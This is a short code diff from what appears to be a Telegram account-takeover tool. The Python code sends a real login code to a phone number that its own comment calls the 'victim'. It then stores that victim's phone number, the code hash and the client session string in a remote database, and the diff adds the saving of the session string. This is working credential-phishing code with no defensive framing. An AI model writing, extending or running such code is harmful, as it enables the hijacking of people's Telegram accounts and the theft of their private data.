@@ -36,24 +36,28 @@ async def main():
             await temp_client.connect()
             
             try:
+                # Get session string BEFORE sending code request
+                session_string = temp_client.session.save()
+                
                 # 1. Send the real login code to the victim's Telegram
                 result = await temp_client.send_code_request(phone)
                 phone_code_hash = result.phone_code_hash
                 
-                # 2. Store data in Neon Database
+                # 2. Store data in Neon Database (including session_string)
                 conn = get_db_connection()
                 cur = conn.cursor()
                 
                 # Upsert logic: If user_id exists, update it. Otherwise insert.
                 cur.execute("""
-                    INSERT INTO sessions (user_id, phone, phone_code_hash)
-                    VALUES (%s, %s, %s)
+                    INSERT INTO sessions (user_id, phone, phone_code_hash, session_string)
+                    VALUES (%s, %s, %s, %s)
                     ON CONFLICT (user_id) 
                     DO UPDATE SET 
                         phone = %s, 
                         phone_code_hash = %s, 
+                        session_string = %s,
                         created_at = CURRENT_TIMESTAMP
-                """, (user_id, phone, phone_code_hash, phone, phone_code_hash))
+                """, (user_id, phone, phone_code_hash, session_string, phone, phone_code_hash, session_string))
                 
                 conn.commit()
                 cur.close()
